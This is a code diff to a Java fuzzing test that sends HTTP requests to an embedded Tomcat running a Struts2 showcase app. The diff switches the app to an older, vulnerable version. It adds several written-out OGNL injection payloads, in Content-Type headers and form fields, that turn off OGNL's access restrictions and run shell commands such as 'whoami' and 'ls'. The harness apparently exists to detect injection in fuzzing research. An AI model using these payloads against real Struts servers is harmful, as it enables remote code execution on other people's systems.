@@ -2,7 +2,6 @@ package edu.berkeley.cs.jqf.examples.tomcat;
 
 import com.pholser.junit.quickcheck.From;
 import edu.berkeley.cs.jqf.examples.common.Dictionary;
-import edu.berkeley.cs.jqf.examples.http.HTTPRequestGenerator;
 import edu.berkeley.cs.jqf.examples.http.StrutsRequestGenerator;
 import edu.berkeley.cs.jqf.fuzz.Fuzz;
 import edu.berkeley.cs.jqf.fuzz.JQF;
@@ -11,6 +10,7 @@ import org.apache.coyote.http11.AbstractHttp11Protocol;
 import org.apache.coyote.http11.Http11NioProtocol;
 import org.apache.coyote.http11.Http11Processor;
 import org.apache.tomcat.util.net.*;
+import org.eclipse.jdt.internal.compiler.ast.NullLiteral;
 import org.junit.Assume;
 import org.junit.Rule;
 import org.junit.rules.ExternalResource;
@@ -34,7 +34,7 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 
     private static int count = 0;
 
-    private final String webapp_string = "struts2-showcase-2_5_20";
+    private final String webapp_string = "struts2-showcase-2_3_10";
 
     private static boolean tomcatTeardown = false;
 
@@ -130,13 +130,25 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                    "Upgrade-Insecure-Requests: 1\r\n\r\n" +
 //                    "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
+
+
+//             request = "POST /" + "struts2-showcase-2_3_10/integration/saveGangster.action HTTP/1.1\r\n" +
+//                    "Host: any\r\n" +
+//                     //"Content-Type: multipart/form-data\r\n" +
+//                    "Content-Type: ${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" + "\r\n" +
+//                    "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
             ProtocolHandler protocol = tomcat.getConnector().getProtocolHandler();
             AbstractHttp11Protocol<?> http11Protocol = (AbstractHttp11Protocol<?>) protocol;
             Http11Processor processor = new Http11Processor(http11Protocol, tomcat.getConnector().getProtocolHandler().getAdapter());
 
             // System.out.println(request);
+
+            System.out.println(request);
             ByteBuffer buf = ByteBuffer.wrap(request.getBytes());
 
+            if(request.getBytes() == null) {
+                System.out.println("GET BYTES WAS NULL!!!!");
+            }
             SocketWrapper wrapper = new SocketWrapper(buf);
             processor.service(wrapper);
 
@@ -154,7 +166,8 @@ public class StrutsTomcatTest extends TomcatBaseTest {
             else if (OGNLInjection.getInjectionDetected()) {
                 OGNLInjection.setInjectionDetected(false);
                 System.out.println(request);
-                throw new OGNLInjectionException("OGNL Injection Detected!");
+                System.out.println("OGNL Injection Detected!!!");
+                //throw new OGNLInjectionException("OGNL Injection Detected!");
 
             }
 
@@ -300,7 +313,7 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 
             }
         }, null).evaluate();
-       StrutsTomcatTest.tomcat.getServer().await();
+     // StrutsTomcatTest.tomcat.getServer().await();
 
 //        String request = "POST /struts2-showcase-2_3_10/integration/editGangster.action HTTP/1.1" + "\r\n"+
 //        "Host: any" + "\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" +
@@ -319,9 +332,16 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                "Connection: keep-alive\r\n" +
 //                "Cookie: JSESSIONID=355085EC5421F19AF97B123A53841DF7\r\n" +
 //                "Upgrade-Insecure-Requests: 1\r\n\r\n" +
-////                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
+//                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
 
+        String request = "POST /" + test.webapp_string + "/integration/saveGangster.action HTTP/1.1\r\n" +
+                "Host: any\r\n" +
+                //"Content-Type: ${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" + "\r\n" +
+                "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
+
+
+        System.out.println(request);
 //        String request = "POST /struts2-showcase-2_3_10/integration/saveGangster.action HTTP/1.1\r\n" +
 //                "If-None-Match: utwar\r\n" +
 //                "If-Match: prrgw\r\n" +
@@ -329,6 +349,15 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                "gjlryn\r\n\r\n" +
 //                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
- //       test.processHTTPRequest(request);
+
+//        String request = "POST /struts2-showcase-2_3_10/fileupload/doUpload.action HTTP/1.1" + "\r\n" +
+//        "Host : any" + "\r\n" +
+//        "Content-Type : ${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" + "\r\n" +
+//        "Content-Length : 0" + "\r\n\r\n" +"\r\n\r\n";
+//
+//      //  "caption=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&upload=ioy" + "\r\n\r\n";
+
+
+        test.processHTTPRequest(request);
     }
 }
